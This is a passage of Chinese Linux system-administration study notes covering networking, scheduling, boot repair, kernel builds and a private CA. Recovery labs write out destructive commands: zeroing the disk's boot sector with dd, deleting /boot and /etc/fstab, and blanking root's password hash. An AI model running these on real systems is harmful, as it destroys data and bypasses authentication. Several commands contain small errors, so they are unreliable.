[02:14:05 root@hostname ~]#lsof -i :6666
```

![1650305821914](linuxSRE.assets/1650305821914.png)

## 17.ARP协议

```
[11:28:15 root@hostname ~]#ping 10.0.0.153
[11:29:28 liu@ubuntu1804 ~]$sudo tcpdump -i ens33 arp -nn #类似抓包
[11:28:15 root@hostname ~]#arp -n #ip到mac映射
[11:28:15 root@hostname ~]#arping 10.0.0.153 #如果有两个mac地址则冲突
```

![1650426032557](linuxSRE.assets/1650426032557.png)

![1650471795705](linuxSRE.assets/1650471795705.png)

## 18.开启路由转发

```
[19:29:18 root@centos7 ~]#sysctl -a |grep ip_forward
 #net.ipv4.ip_forward = 0
[19:32:21 root@centos7 ~]#vim /etc/sysctl.conf
 #改这个net.ipv4.ip_forward = 1
[19:57:02 root@centos7 ~]#sysctl -p #让他立即生效
```

![1650455938089](linuxSRE.assets/1650455938089.png)

## 19.多网卡绑定

### 19.1bonding工作模式

```
共7种模式：0-6 Mode
Mode 0 (balance-rr)： 轮询（Round-robin）策略，从头到尾顺序的在每一个slave接口上面发送

数据包。本模式提供负载均衡和容错的能力

Mode 1 (active-backup)： 活动-备份（主备）策略，只有一个slave被激活，当且仅当活动的
slave接口失败时才会激活其他slave.为了避免交换机发生混乱此时绑定的MAC地址只有一个外部
端口上可见
Mode 3 (broadcast)：广播策略，在所有的slave接口上传送所有的报文,提供容错能力
说明：
active-backup、balance-tlb 和 balance-alb 模式不需要交换机的任何特殊配置。其他绑定模式需要配
置交换机以便整合链接。如：Cisco 交换机需要在模式 0、2 和 3 中使用 EtherChannel，但在模式4中
需要 LACP和 EtherChannel
```

### 19.2添加bonding接口

```
[20:56:07 root@centos7 ~]#nmcli connection add con-name mybond0 ifname bond0 type bond mode active-backup ipv4.method manual ipv4.addresses 10.0.0.100/24
[21:01:02 root@centos7 ~]#nmcli connection 
NAME                UUID                                  TYPE      DEVICE 
eth0                5fb06bd0-0bb0-7ffb-45f1-d6edd65f3e03  ethernet  eth0   
Wired connection 1  d08846ea-eaa9-3869-a7d8-67fffefb5b02  ethernet  eth1
[21:01:16 root@centos7 ~]#cdnet #这是我起的别名 alias cdnet='cd /etc/sysconfig/network-scripts'
[21:01:23 root@centos7 network-scripts]#ls #找到自动生成的ifcfg-mybond文件
```

![1650459943218](linuxSRE.assets/1650459943218.png)

### 19.3删除bonding接口

```
#注意这个时候删除mybond0网会断，ip会变成你原本来的ip:10.0.0.7
#还有个小细节，你要到你的vmare把之前的NAT打开
[21:42:44 root@centos7 ~]#nmcli connection delete mybond0
[21:50:35 root@centos7 ~]#nmcli connection delete bond-slave-eth0
[21:50:35 root@centos7 ~]#nmcli connection delete bond-slave-eth1
```

![1650462903064](linuxSRE.assets/1650462903064.png)

### 19.4添加从属接口

```
[21:03:23 root@centos7 network-scripts]#nmcli connection add type bond-slave ifname eth1 master bond0
[21:16:55 root@centos7 network-scripts]#nmcli connection add type bond-slave ifname eth0 master bond0
[21:17:06 root@centos7 network-scripts]#nmcli connection 
NAME                UUID                                  TYPE      DEVICE 
eth0                5fb06bd0-0bb0-7ffb-45f1-d6edd65f3e03  ethernet  eth0   
Wired connection 1  d08846ea-eaa9-3869-a7d8-67fffefb5b02  ethernet  eth1   
mybond0             fb0eae39-270f-4875-9db5-873e74c0a076  bond      bond0  
bond-slave-eth0     f53e20f6-ec0b-4283-89c7-77c427649cf1  ethernet  --     
bond-slave-eth1     ffc76a9b-4178-4bec-aa65-1e4d4c5f499a  ethernet  --  	
```

![1650460840660](linuxSRE.assets/1650460840660.png)

### 19.5启动主从属接口

```
[21:25:59 root@centos7 ~]#nmcli connection up  bond-slave-eth1
#注意启动eth0的时候网会断掉，然后重连的时候网址就是10.0.0.100了
[21:25:59 root@centos7 ~]#nmcli connection up bond-slave-eth0
[21:25:59 root@centos7 ~]#nmcli connection up mybond0
[21:25:59 root@centos7 ~]#cat /proc/net/bonding/bond0 #查看主从
```

![1650461357569](linuxSRE.assets/1650461357569.png)

## 20.网桥的实现

### 20.1创建网桥

```
nmcli con add type bridge con-name br0 ifname br0
nmcli connection modify br0 ipv4.addresses 192.168.0.100/24 ipv4.method manual
nmcli con up br0
```

### 20.2加入物理网卡

```
nmcli con add type bridge-slave con-name br0-port0 ifname eth0 master br0
nmcli con add type bridge-slave con-name br0-port1 ifname eth1 master br0
nmcli con up br0-port0
nmcli con up br0-port1
```

### 20.3查看网桥配置文件

```
cat /etc/sysconfig/network-scripts/ifcfg-br0
DEVICE=br0
STP=yes
TYPE=Bridge
BOOTPROTO=static
IPADDR=192.168.0.100
PREFIX=24
cat /etc/sysconfig/network-scripts/ifcfg-br0-port0
TYPE=Ethernet
NAME=br0-port0
DEVICE=eth0
ONBOOT=yes
BRIDGE=br0
UUID=23f41d3b-b57c-4e26-9b17-d5f02dafd12d
```

### 20.4安装管理软件包

```
yum install bridge-utils
brctl show
```

### 20.5删除网桥

```
nmcli con down br0
rm /etc/sysconfig/network-scripts/ifcfg-br0*
nmcli con reload
```

## 21.面试题合集

### 21.1找到未知进程的执行程序文件路径

```
[20:54:41 root@liu ~]#ps aux k -%cpu #先查找哪个进程利用率最高
[20:54:41 root@liu ~]#ll /proc/3053/exe #找到exe执行文件查看是否病毒
```

![1650979458454](linuxSRE.assets/1650979458454.png)

### 21.2执行 cp /etc/issue /data/dir 所需要的最小权限？

```
/bin/cp 需要x权限
/etc/ 需要x权限
/etc/issue 需要r 权限
/data 需要x权限
/data/dir 需要w,x 权限
```

### 21.3Linux中的目录和文件的权限区别？

```
对文件的权限：
1、r 可使用文件查看类工具，比如：cat，可以获取其内容
2、w 可修改其内容
3、x 可以把此文件提请内核启动为一个进程，即可以执行（运行）此文件（此文件的内容必须是可执行）

对目录的权限：
1、r 可以使用ls查看此目录中文件列表
2、w 可在此目录中创建文件，也可删除此目录中的文件，而和此被删除的文件的权限无关
3、x 可以cd进入此目录，可以使用ls -l查看此目录中文件元数据（须配合r权限），属于目录的可访问的最小权限
4、X 只给目录x权限，不给无执行权限的文件x权限

注：
1、用户的最终权限，是从左向右进行顺序匹配，即，所有者，所属组，其他人，一旦匹配权限立即生效，不再向右查看其权限
2、r和w权限对root用户无效，即权限的修改不影响root用户的r和w，但会影响x
3、只要所有者，所属组或other三者之一有x权限，root就可以执行
4、文件能不能删，和所在文件夹的权限有关
```

### 21.4.11月每天的6-12点之间每隔2小时执行/app/bin/test.sh

```
0 6-12/2 * 11 * /app/bin/test.sh
```

### 21.5文件host_list.log 如下格式，请提取”.magedu.com”前面的主机名部分并写入到回到该文件中

```
[root@centos8 ~]#cat host_list.log
1 www.magedu.com
2 blog.magedu.com
3 study.magedu.com
4 linux.magedu.com
5 python.magedu.com
www
blog
study
linux
python
追加到host_list.log
#答案
[23:42:00 root@liu ~]#awk -F'[ .]' '{print $2}' host_list.log >> host_list.log
```

### 21.6有两个文件，a.txt与b.txt ，合并两个文件，并输出时确保每个数字也唯一

```
#方法一
[16:37:54 root@liu ~]#cat a.txt b.txt |sort -u
#方法二
[16:40:02 root@liu ~]#cat b.txt |uniq -u
```

### 21.7统计当前服务器状态出现的次数

```
[16:18:54 root@liu ~]#ss -tan
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN     0      128             *:22                          *:*                  
LISTEN     0      100     127.0.0.1:25                          *:*                  
ESTAB      0      36       10.0.0.7:22                   10.0.0.1:13061              
ESTAB      0      0        10.0.0.7:22                   10.0.0.1:13054              
LISTEN     0      128          [::]:80                       [::]:*                  
LISTEN     0      128          [::]:22                       [::]:*                  
LISTEN     0      100         [::1]:25                       [::]:*                  
LISTEN     0      128          [::]:9090                     [::]:* 
[16:19:05 root@liu ~]#ss -tan | awk 'NR!=1{state[$1]++}END{for(i in state){print i,state[i]}}'
```

![1651307154838](linuxSRE.assets/1651307154838.png)

### 21.8DNS的53/TCP和53/UDP分别是干什么的？

```
53/UDP:查询(域名解析)区域传输(主从复制)
53/TCP:只用于区域传输(主从复制)
```

### 21.9出现table full,dropping packet是什么原因？

```
[root@centos8 ~]# echo 1 > /proc/sys/net/netfilter/nf_conntrack_max
[root@centos8 ~]# tail /var/log/messages
Jul 8 10:03:53 centos8 kernel:nf_conntrack:table full,dropping packet
原因：连接数设置的太少了，应该适当调大
```

### 21.10MyISAM和InnoDB区别

```
#MyISAM 引擎特点
不支持事务
表级锁定
读写相互阻塞，写入不能读，读时不能写
只缓存索引
不支持外键约束
不支持聚簇索引
读取数据较快，占用资源较少
不支持MVCC（多版本并发控制机制）高并发
崩溃恢复性较差
MySQL5.5.5 前默认的数据库引擎
MyISAM 存储引擎适用场景
只读（或者写较少）
表较小（可以接受长时间进行修复操作）
MyISAM 引擎文件
tbl_name.frm 表格式定义
tbl_name.MYD 数据文件
tbl_name.MYI 索引文件


#InnoDB引擎特点
行级锁
支持事务，适合处理大量短期事务
读写阻塞与事务隔离级别相关
可缓存数据和索引
支持聚簇索引
崩溃恢复性更好
支持MVCC高并发
从MySQL5.5后支持全文索引
从MySQL5.5.5开始为默认的数据库引擎
```

### 21.11InnoDB中一颗的B+树可以存放多少行数据？

```
假设定义一颗B+树高度为2，即一个根节点和若干叶子节点。那么这棵B+树的存放总行记录数=根节点指针数*
单个叶子记录的行数。这里先计算叶子节点，B+树中的单个叶子节点的大小为16K，假设每一条目为1K，那么
记录数即为16(16k/1K=16)，然后计算非叶子节点能够存放多少个指针，假设主键ID为bigint类型，那么
长度为8字节，而指针大小在InnoDB中是设置为6个字节，这样加起来一共是14个字节。那么通过页大小/(主 键ID大小+指针大小），即16384/14=1170个指针，所以一颗高度为2的B+树能存放18720条这样的记录。
根据这个原理就可以算出一颗高度为3的B+树可以存放1170*1170*16=21902400条记录。所以在InnoDB中 B+树高度一般为2-3层，它就能满足千万级的数据存储
```

![1653397141840](linuxSRE.assets/1653397141840.png)

### 21.12造成mysql主从不一致的原因

```
#1.造成主从不一致的原因
主库binlog格式为Statement，同步到从库执行后可能造成主从不一致。
主库执行更改前有执行set sql_log_bin=0，会使主库不记录binlog，从库也无法变更这部分数据。
从节点未设置只读，误操作写入数据
主库或从库意外宕机，宕机可能会造成binlog或者relaylog文件出现损坏，导致主从不一致
主从实例版本不一致，特别是高版本是主，低版本为从的情况下，主数据库上面支持的功能，从数
据库上面可能不支持该功能
MySQL自身bug导致


#2.主从不一致修复方法
将从库重新实现
虽然这也是一种解决方法，但是这个方案恢复时间比较慢，而且有时候从库也是承担一部分的查询
操作的，不能贸然重建。
使用percona-toolkit工具辅助
PT工具包中包含pt-table-checksum和pt-table-sync两个工具，主要用于检测主从是否一致以及修
复数据不一致情况。这种方案优点是修复速度快，不需要停止主从辅助，缺点是需要知识积累，需
要时间去学习，去测试，特别是在生产环境，还是要小心使用
关于使用方法，可以参考下面链接：https://www.cnblogs.com/feiren/p/7777218.html
手动重建不一致的表
在从库发现某几张表与主库数据不一致，而这几张表数据量也比较大，手工比对数据不现实，并且
重做整个库也比较慢，这个时候可以只重做这几张表来修复主从不一致这种方案缺点是在执行导入期间需要暂时停止从库复制，不过也是可以接受的


#3.如何避免主从不一致
主库binlog采用ROW格式
主从实例数据库版本保持一致
主库做好账号权限把控，不可以执行set sql_log_bin=0
从库开启只读，不允许人为写入
定期进行主从一致性检验
```

### 21.13找出失败登录次数最多的前10个IP

```
#方式一：
-f, --file <file>    use a specific file instead of /var/log/btmp
[root@centos8 ~]#lastb -f btmp-test1 | awk '{print $3}'|sort | uniq -c|sort -nr|head


#方式二：
[root@centos8 ~]#lastb -f btmp-test2 | awk '{ip[$3]++}END{for(i in ip){print 
ip[i],i}}'|sort -nr|head
```

## 22.正在访问文件被删复原

```
#注意：这个复原只能是适用于当前文件正在被别的进程访问的时候误删了
[23:34:12 root@liu ~]#rm -rf /var/log/messages #比如删除的这个文件
[23:33:45 root@liu ~]#lsof|grep delete
rsyslogd  3322         root    7w      REG                8,2    142980  134327663 /var/log/messages (deleted)
in:imjour 3322 3820    root    7w      REG                8,2    142980  134327663 /var/log/messages (deleted)
rs:main   3322 3821    root    7w      REG                8,2    142980  134327663 /var/log/messages (delete）
[23:38:11 root@liu ~]#ll /proc/3322/fd #这里的3322是进程号
[23:42:00 root@liu ~]#cat /proc/3322/fd/7 > /var/log/messages #进行恢复
```

![1650987818594](linuxSRE.assets/1650987818594.png)

## 23.作业管理

### 23.1流程图

![1651032241462](linuxSRE.assets/1651032241462.png)

### 23.2并行运行

```
13:21:57 root@liu ~]#f1.sh&f2.sh&f3.sh& #表示后台运行
#案例：并行ping通254台主机
-c1 ping一次
-W1 超时时间1s
###################################################################
# File Name: scan_host.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Wed 27 Apr 2022 01:36:43 PM CST
#=============================================================
#!/bin/bash
net=10.0.0

for i in {1..254};do
   {   
    ping -c1 -W1 $net.$i &> /dev/null && echo $net.$i is up || echo $net.$i is down   }&

done
wait #结束后主动退出
```

![1651038662566](linuxSRE.assets/1651038662566.png)

## 24.计划任务

### 24.1环境准备

```
#需要实现邮件通知,必须安装并启动邮件服务
[13:55:24 root@liu ~]#yum -y install postfix
[14:14:15 root@liu ~]##systemctl enable --now postfix
```

### 24.2一次性任务

- **未来的某时间点执行一次任务**
- **at** 
- **指定时间点，执行一次性任务**
- **batch 系统自行选择空闲时间去执行此处指定的任务**
- **周期性运行某任务**
- **cron**

```
at [option] TIME

-V 显示版本信息
-t time   时间格式 [[CC]YY]MMDDhhmm[.ss] 
-l 列出指定队列中等待运行的作业；相当于atq
-d N 删除指定的N号作业；相当于atrm
-c N 查看具体作业N号任务
-f file 指定的文件中读取任务
-m 当任务被完成之后，将给用户发送邮件，即使没有标准输出
HH:MM [YYYY-mm-dd]
noon, midnight, teatime（4pm）,tomorrow
now+#{minutes,hours,days, OR weeks}

[14:31:20 root@liu ~]#systemctl start atd #先启动atd服务
[14:34:37 root@liu ~]#systemctl status atd #查看启动状态
```

 ![1651041453940](linuxSRE.assets/1651041453940.png)

```
#1.at执行的一次性任务是临时的，关机就没了
[18:49:31 root@liu ~]#at -l #查看任务列表
[18:50:21 root@liu ~]#at 18:53 #设置时间
at> echo at job is running
at> <EOT>
job 1 at Wed Apr 27 18:53:00 2022
[18:53:40 root@liu ~]#mail #发的echo命令是以邮件的方式发送给你
[18:53:40 root@liu ~]#at -d 作业编号 #删除某个定时任务
#2.禁止某个用户创建计划任务
#/etc/at.{allow,deny} 控制用户是否能执行at任务
#白名单：/etc/at.allow 默认不存在，只有该文件中的用户才能执行at命令
#黑名单：/etc/at.deny 默认存在，拒绝该文件中用户执行at命令，而没有在#at.deny 文件中的使用
#者则可执行
#如果两个文件都不存在，只有 root 可以执行 at 命令
[18:53:40 root@liu ~]#vim /etc/at.deny #默认空文件
写入wang
```

![1651057382164](linuxSRE.assets/1651057382164.png)

![1651058151144](linuxSRE.assets/1651058151144.png)

### 24.3周期性任务cron

```
#1.查看cron的格式
[19:20:26 root@liu ~]#cat /etc/crontab 
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed

#示例：
*/10 * * * * #每10分钟执行一次
0 * * * * #每小时整执行 0点..1点..
* * 1，10，20 * * #每个月的1号，10号，20号
* * 1-5，10，20 * * #每个月的1号到5号，10号，20号
* * 1-5，10，20 * 0，6 #每个月的1号到5号，10号，20号或者星期六星期日
* 2-10/2 * * * #从2点到10点每两个小时执行一次
用;隔开执行多个任务

#2.创建计划任务
crontab [-u user] [-l | -r | -e] [-i]
-l 列出所有任务
-e 编辑任务
-r 移除所有任务
-i 同-r一同使用，以交互式模式移除指定任务
-u user 指定用户管理cron任务,仅root可运行
控制用户执行计划任务：
/etc/cron.{allow,deny}
范例：修改默认的cron的文本编辑工具
[20:10:21 root@liu ~]#chmod +x /usr/local/bin/test.sh #给脚本执行权限
[20:07:17 root@liu ~]#crontab -e #创建计划任务
esc模式下r!echo $PATH添加路径
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/sbin:/root/bin
* * * * *代表每分每秒执行 + 你写的脚本
[20:10:21 root@liu ~]#mail #查看邮件
[20:10:21 root@liu ~]#rm -f /var/spool/mail/root #删除邮件

#运行一个文件夹下的所有可执行脚本
[20:41:52 root@liu ~]#run-parts /data/
```

![1651061668525](linuxSRE.assets/1651061668525.png)

## 25.Linux启动流程

### 25.1CentOS 6启动流程

http://s4.51cto.com/wyfs02/M02/87/20/wKiom1fVBELjXsvaAAUkuL83t2Q304.jpg

![1651309445148](linuxSRE.assets/1651309445148.png)

### 25.2grub故障修复

#### 25.2.1破坏grub第1阶段

```
#把sda全446个字节全部清0
[19:30:34 root@liu ~]#dd if=/dev/zero of=/dev/sda bs=1 count=446
#进入救援模式下
sh-4.2#chroot /mnt/sysimage #切换根
#centos 6是grub-install /dev/sda
bash-4.2#grub2 install /dev/sda #注意这是针对centos 7
[19:38:19 root@liu ~]#hexdump -C -n 512 /dev/sda -v
```

#### 25.2.2破坏grub第2阶段

```
#直接破坏grub2的grub.config
[19:08:16 root@liu ~]#rm -rf /boot/grub2
#进入救援模式下
sh-4.2#chroot /mnt/sysimage #切换根
#centos 6是grub-install /dev/sda
bash-4.2#grub2 install /dev/sda #注意这是针对centos 7
#这个编写配置文件是centos6上的恢复 centos7没用
bash-4.2#vim /boot/grub2/grub.conf
```

![1651319939813](linuxSRE.assets/1651319939813.png)

#### 25.2.3一分钟破解密码

```
#方法一：
#1.先切换路径
sh-4.2#chroot /mnt/sysimage/
#2.进入存放密码的路径下
bash-4.2# vim /etc/shadow
#3.把root的密文修改即可
root::19088:0:99999:7:::
#4.按wq!进行退出

#方法二：
启动时任意键暂停启动
按e键进入编辑模式
将光标移动linux 开始的行，添加内核参数rd.break
按ctrl-x启动
mount –o remount,rw /sysroot
chroot /sysroot
passwd root
```

![1651375062280](linuxSRE.assets/1651375062280.png)

### 25.3rm -rf /boot/* 和 /etc/fstab 故障恢复

```
#实验
[22:50:06 root@liu ~]#rm -rf /boot/* #删除内核等配置文件
[22:52:56 root@liu ~]#rm -rf /etc/fstab #删除挂载分区

#1.进入救援模式，先找回文件系统，修复/etc/fstab
#这个很重要 查看分区和文件系统对应关系，如果对应关系写错 就会出现====================一长串这样子的字符
sh-4.2# blkid 
sh-4.2# mkdir /mnt/rootfs
sh-4.2# mount /dev/sda2 mnt/rootfs #找到小型根
sh-4.2# ls /mnt/rootfs
sh-4.2# vi /mnt/rootfs/etc/fstab
#编写如下内容
#这里巨坑的一点就是你的文件系统名称一定要和sda分区一一对应
/dev/sda1  /boot  ext4  defaults 0 0
/dev/sda2  /      xfs   defaults 0 0
/dev/sda3  swap   swap  defaults 0 0 #可写可不写
sh-4.2#sync;exit; 

#重启再次进入救援模式
#2.修复boot
sh-4.2# chroot /mnt/sysimage/
bash-4.2# mount /dev/sr0 /mnt
#安装内核
#centos7
bash-4.2# rpm -ivh /mnt/Packages/kernel-3.10.0-1160.e17.X86_64.rpm --force
#centos8
bash-4.2# rpm -ivh /mnt/BaseOS/Packages/kernel-core-4.18.0-147.el8.x86_64.rpm --force
#修复grub
bash-4.2# grub2-install /dev/sda
#生成grub.cfg文件
#注意这个命令是针对centos7的，centos6需要手写配置文件
bash-4.2# grub2-mkconfig -o /boot/grub2/grub.cfg
sh-4.2#sync;exit; 
```

![1651460857674](linuxSRE.assets/1651460857674.png)

### 25.4循环重启故障修复

```
[10:41:53 root@liu ~]#systemctl set-default reboot.target  #这就是设置循环重启
```

![1651546424007](linuxSRE.assets/1651546424007.png)

![1651546476739](linuxSRE.assets/1651546476739.png)

![1651546968379](linuxSRE.assets/1651546968379.png)

![1651547277397](linuxSRE.assets/1651547277397.png)

### 25.5开机自动运行脚本

```
#在rc.local里面设置开机启动项目
#1.先要给这个文件加上执行权限
[22:06:25 root@liu ~]#chmod +x /etc/rc.d/rc.local
#2.随便写个脚本测试一下
[22:07:16 root@liu data]#vim test_local.sh
touch /data/test_local.txt
#给你自己的写的脚本加上执行权限
[22:09:24 root@liu data]#chmod +x test_local.sh
[22:06:25 root@liu ~]#vim /etc/rc.d/rc.local
touch /var/lock/subsys/local
/data/test_local.sh #这个是你自己要开机启动的脚本
[22:06:25 root@liu ~]#reboot
```

![1651415381035](linuxSRE.assets/1651415381035.png)

### 25.6编译安装内核

#### 25.6.1预备工作

```
案例：编译内核让linux支持真实的物理磁盘上的文件系统ntfs
1.先在Windows上新加卷
先压缩卷，然后再添加简单卷一路确定即可,默认是ntfs的文件系统
2.VMware添加添加硬盘，点击使用物理磁盘，确定，在点击使用单个分区，勾选上你自己在电脑上划分的分区，后序无脑下一步即可！
3.在www.kernel.org官网上下载最新版本的内核
4.在VMware上把你的内存内核都调到你主机能支持的最大上限，因为这个实验非常的耗费时间
```

**1.先在Windows上新加卷**

![1651479534164](linuxSRE.assets/1651479534164.png)

**2.VMware添加添加硬盘**

![1651479954681](linuxSRE.assets/1651479954681.png)

![1651479988687](linuxSRE.assets/1651479988687.png)

![1651480044393](linuxSRE.assets/1651480044393.png)

**3.下载最新版本的内核**

![1651480291340](linuxSRE.assets/1651480291340.png)

**4.VMware上设置内存内核**

![1651481468632](linuxSRE.assets/1651481468632.png)

#### 25.6.2开始编译安装

```
[15:54:39 root@liu ~]#lsblk -f #先产看是否硬盘添加成功
[15:54:39 root@liu ~]#yum -y install gcc make ncurses-devel flex bison openssl-devel elfutils-libelf-devel            
#然后把下载好的内核源码拖到xshell里面
[16:39:20 root@liu ~]#tar xvf linux-5.17.5.tar.xz -C /usr/local/src  #解压缩到/usr/local/src下
[16:42:30 root@liu ~]#cd /usr/bin/src
[16:43:08 root@liu src]#ls
linux-5.17.5
[16:51:53 root@liu src]#cd linux-5.17.5/
[16:52:13 root@liu linux-5.17.5]#cp /boot/config-3.10.0-1160.el7.x86_64 .config
[16:53:11 root@liu linux-5.17.5]#vim .config
#修改下面的三行
先vim上搜索/CONFIG_MODULE_SIG
CONFIG_MODULE_SIG=y #注释掉，不然编译需要签名
CONFIG_DEBUG_INFO=y #注释掉
CONFIG_SYSTEM_TRUSTED_KEYS=""
[17:12:47 root@liu linux-5.17.5]#make menuconfig
```

![1651485558644](linuxSRE.assets/1651485558644.png)

![1651485615508](linuxSRE.assets/1651485615508.png)

![1651485702923](linuxSRE.assets/1651485702923.png)

![1651485760238](linuxSRE.assets/1651485760238.png)

![1651485884294](linuxSRE.assets/1651485884294.png)

![1651486034636](linuxSRE.assets/1651486034636.png)

```
[18:07:38 root@liu linux-5.17.5]#grep -i ntfs .config
#出现下面这三个表示已经设置成功了！！
CONFIG_NTFS_FS=m
CONFIG_NTFS_DEBUG=y
CONFIG_NTFS_RW=y
[19:43:08 root@liu linux-5.17.5]#make -j 8
#在编译内核的时候出现了如下的错误
```

![1651495256932](linuxSRE.assets/1651495256932.png)

```
#解决方案如下：
[20:36:45 root@liu linux-5.17.5]#yum search libelf
[20:36:45 root@liu linux-5.17.5]#yum -y install elfutils-libelf-devel.x86_64 #安装这个包即可解决

#最后两个步骤！！make modules_install和make install
[20:36:45 root@liu linux-5.17.5]#make modules_install
[21:41:35 root@liu linux-5.17.5]#ls /lib/modules
#5.17.5-liu-linux是自动生成的内核module文件
#3.10.0-1160.el7.x86_64  5.17.5-liu-linux
[21:42:30 root@liu linux-5.17.5]#make install
sh ./arch/x86/boot/install.sh 5.17.5-liu-linux 
\arch/x86/boot/bzImage System.map "/boot"
[21:44:22 root@liu linux-5.17.5]#reboot
#只有读权限
[21:44:22 root@liu linux-5.17.5]#mount /dev/sdb2 /mnt
```

![1651499540310](linuxSRE.assets/1651499540310.png)

#### 25.6.3卸载内核

```
[13:53:59 root@liu ~]#cd /usr/local/src/
[13:56:05 root@liu src]#rm -rf *
[13:56:56 root@liu src]#rm -rf /lib/modules/5.17.5-liu-linux/
[13:59:53 root@liu src]#ls /boot #查看你的内核版本名
[14:00:00 root@liu src]#find /boot -name "*5.17.5*" -delete 
[14:10:54 root@liu ~]#grub2-mkconfig -o /boot/grub2/grub.cfg
```

![1651558446648](linuxSRE.assets/1651558446648.png)

## 26.升级gcc编译器

```
[15:54:39 root@liu ~]#yum -y install centos-release-scl
[15:54:39 root@liu ~]#yum install devtoolset-9-gcc* -y
[15:54:39 root@liu ~]#scl enable devtoolset-9 bash
#写入/etc/profile使其永久生效
[15:54:39 root@liu ~]#echo "source /opt/rh/devtoolset-9/enable" >>/etc/profile
```

![1651485257054](linuxSRE.assets/1651485257054.png)

## 27.Linux根据端口号查看被占用的服务

```
#查看端口号
[23:06:48 root@liu ~]#ss -ntl
#1.根据端口号查看pid
[23:02:41 root@liu ~]#netstat -tunlp | grep 81
tcp        0      0 0.0.0.0:81              0.0.0.0:*               LISTEN      16397/nginx: master 
tcp6       0      0 :::81                   :::*                    LISTEN      16397/nginx: master 

#2.根据pid查看服务名称
[23:04:20 root@liu ~]#ps -ef | grep 16397	

#3.关闭服务
[23:04:52 root@liu ~]#systemctl stop nginx.service

#3.开启服务
[23:09:46 root@liu ~]#systemctl enable --now nginx.service #开机启动+激活

#4.关闭一个端口所占用的所有程序
[root@paranoid ~]# $ lsof -i :80|grep -v "PID"|awk '{print "kill -9",$2}'|sh
```

![1651504104596](linuxSRE.assets/1651504104596.png)

## 28.加密和安全

### 28.1搭建私有CA

```
#1.创建CA所需要的文件
#生成证书索引数据库文件
[13:06:01 root@liu ~]#touch /etc/pki/CA/index.txt 
#指定第一个颁发证书的序列号
[13:06:01 root@liu ~]#echo 01 > /etc/pki/CA/serial
#centos8才需要创建，centos7上默认有这个
[13:06:01 root@liu ~]#mkdir /etc/pki/CA{certs,crl,newcerts,private} -p

#2.生成CA私钥
[15:47:55 root@liu ~]#cd /etc/pki/CA/
#umask的计算规则是：
1.如果是文件，用666去减
2.如果是文件夹，用777去减
减完后是级数就加1，是偶数就保留
[15:48:30 root@liu CA]#umask 066; openssl genrsa -out private/cakey.pem 2048;

#3.生成CA自签名证书
[16:04:51 root@liu CA]#openssl req -new -x509 -key /etc/pki/CA/private/cakey.pem -days 3650 -out /etc/pki/CA/cacert.pem
#Country Name (2 letter code) [XX]:CN #必须一致
#State or Province Name (full name) []:jiangsu #必须一致
#Locality Name (eg, city) [Default City]:taizhou
#Organization Name (eg, company) [Default Company Ltd]:liusenbiao     #必须一致
#Organizational Unit Name (eg, section) []:it
#Common Name (eg, your name or your server's hostname) []:www.liusenbiao.cn

#注意也可以openssl.cnf修改配置使必须一致的变得可以不一致
policy          = policy_match改成policy_anything
```

![1651653435924](linuxSRE.assets/1651653435924.png)

![1651672777439](linuxSRE.assets/1651672777439.png)

### 28.2用户生成私钥和证书申请

```
[16:39:01 root@liu ~]#mkdir /data/app1
[16:39:11 root@liu ~]#cd  /data/app1
[16:41:00 root@liu app1]#umask 066; openssl genrsa -out /data/app1/app1.key 2048; #创建app1的私钥文件
#生成证书申请文件
#Country Name (2 letter code) [XX]:CN
#State or Province Name (full name) []:jiangsu      
#Locality Name (eg, city) [Default City]:taizhou
#Organization Name (eg, company) [Default Company Ltd]:liusenbiao
#Organizational Unit Name (eg, section) []:sale
#Common Name (eg, your name or your server's hostname) []:www.liusenbiao.cn
#Email Address []: 
[16:49:25 root@liu app1]#ll
total 8
-rw------- 1 root root 1017 May  4 16:49 app1.csr
-rw------- 1 root root 1679 May  4 16:41 app1.key
```

### 28.3颁发证书

```
[16:54:33 root@liu app1]#openssl ca -in /data/app1/app1.csr  -out /etc/pki/CA/certs/app1.crt -days 1000
[17:03:24 root@liu app1]#tree /etc/pki/CA
#验证证书的有效性
[17:03:32 root@liu app1]#openssl ca -status 01 
```

![1651656382071](linuxSRE.assets/1651656382071.png)

![1651679113113](linuxSRE.assets/1651679113113.png)

### 28.4吊销证书

```
[22:01:56 root@liu ~]#cd /etc/pki/CA/
[22:02:12 root@liu CA]#cat index.txt
V	250128085550Z		01	unknown	/C=CN/ST=jiangsu/O=liusenbiao/OU=sale/CN=www.liusenbiao.cn
[22:02:12 root@liu CA]#openssl ca -revoke /etc/pki/CA/newcerts/01.pem
[17:03:32 root@liu app1]#openssl ca -status 01 
#V变成了R
```

### 28.5生成证书吊销列表文件

```
[22:33:13 root@liu CA]#echo 01 > /etc/pki/CA/crlnumber
[22:39:49 root@liu CA]#openssl ca -gencrl -out /etc/pki/CA/crl.pem
[22:40:17 root@liu CA]#sz /etc/pki/CA/crl.pem
```

![1651675519097](linuxSRE.assets/1651675519097.png)

28.6一键搭建CA脚本

```
#!/bin/bash
#
#********************************************************************
#Author:                liusenbiao
#QQ:                    1805336068      
#Date:                  2022-05-04
#FileName：             certificate.sh
#********************************************************************
CA_SUBJECT="/O=liusenbiao/CN=ca.liusenbiao.cn"
SUBJECT="/C=CN/ST=jiangsu/L=taizhou/O=magedu/CN=www.liusenbiao.cn"
SERIAL=34
EXPIRE=202002
FILE=liusenbiao.org

openssl req  -x509 -newkey rsa:2048 -subj $CA_SUBJECT -keyout ca.key -nodes -days 202002 -out ca.crt

openssl req -newkey rsa:2048 -nodes -keyout ${FILE}.key  -subj $SUBJECT -out ${FILE}.csr

openssl x509 -req -in ${FILE}.csr  -CA ca.crt -CAkey ca.key -set_serial $SERIAL  -days $EXPIRE -out ${FILE}.crt

chmod 600 ${FILE}.key ca.key
```

![1651676942809](linuxSRE.assets/1651676942809.png)

### 28.6ssh客户端配置文件

```
#ssh客户端配置文件： /etc/ssh/ssh_config
##StrictHostKeyChecking ask
##首次登录不显示检查提示
#修改StrictHostKeyChecking 从ask到no
